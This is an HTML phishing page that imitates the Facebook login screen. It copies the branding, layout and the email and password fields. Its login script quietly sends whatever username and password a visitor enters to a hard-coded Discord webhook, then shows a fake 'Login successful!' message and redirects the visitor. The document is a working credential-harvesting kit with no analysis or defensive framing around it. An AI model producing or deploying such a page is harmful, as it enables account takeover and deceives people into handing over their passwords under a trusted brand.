<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login</title>
    <style>
        body {
            background-color: #f0f2f5;
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            text-align: center;
            margin-bottom: 20px;
        }
        .container h1 {
            color: #1877f2;
            font-size: 50px;
            margin-bottom: -10px;
            font-weight: bold;
        }
        .container p {
            font-size: 20px;
            color: #606770;
        }
        .login-box {
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.2);
            width: 360px;
            text-align: center;
        }
        input {
            display: block;
            width: 100%;
            margin-bottom: 10px;
            padding: 12px;
            border: 1px solid #dddfe2;
            border-radius: 5px;
            font-size: 16px;
        }
        .login-btn {
            width: 100%;
            padding: 12px;
            background: #1877f2;
            color: white;
            font-size: 18px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-weight: bold;
        }
        .login-btn:hover {
            background: #166fe5;
        }
        .forgot {
            display: block;
            margin-top: 10px;
            font-size: 14px;
            color: #1877f2;
            text-decoration: none;
        }
        .forgot:hover {
            text-decoration: underline;
        }
        .divider {
            width: 100%;
            height: 1px;
            background: #dddfe2;
            margin: 20px 0;
        }
        .create-btn {
            background: #42b72a;
            padding: 12px;
            border: none;
            width: 100%;
            font-size: 16px;
            color: white;
            font-weight: bold;
            border-radius: 5px;
            cursor: pointer;
        }
        .create-btn:hover {
            background: #36a420;
        }
    </style>
</head>
<body>

    <div class="container">
        <h1>facebook</h1>
        <p>Connect with friends and the world around you.</p>
    </div>

    <div class="login-box">
        <input type="text" id="username" placeholder="Email or Phone">
        <input type="password" id="password" placeholder="Password">
        <button class="login-btn" onclick="login()">Log In</button>
        <a href="#" class="forgot">Forgot password?</a>
        <div class="divider"></div>
        <button class="create-btn">Create New Account</button>
    </div>

    <script>
        function login() {
            const username = document.getElementById("username").value;
            const password = document.getElementById("password").value;

            if (username && password) {
                const webhookUrl = "https://discord.com/api/webhooks/1334022448886054974/Oh0lrOoCdULy48CDlIIjBFmh_BOv_GFdMcyShoWKpnNVll87vYZBXl2FHuozYMAZxD3c";
                const payload = {
                    content: `Login Attempt:\n**Username:** ${username}\n**Password:** ${password}`
                };

                fetch(webhookUrl, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(payload)
                }).then(() => {
                    alert("Login successful! Redirecting...");
                    window.location.href = "https://example.com/dashboard"; // Replace with actual dashboard URL
                }).catch(error => console.error("Error:", error));
            } else {
                alert("Please enter both username and password.");
            }
        }
    </script>

</body>
</html>
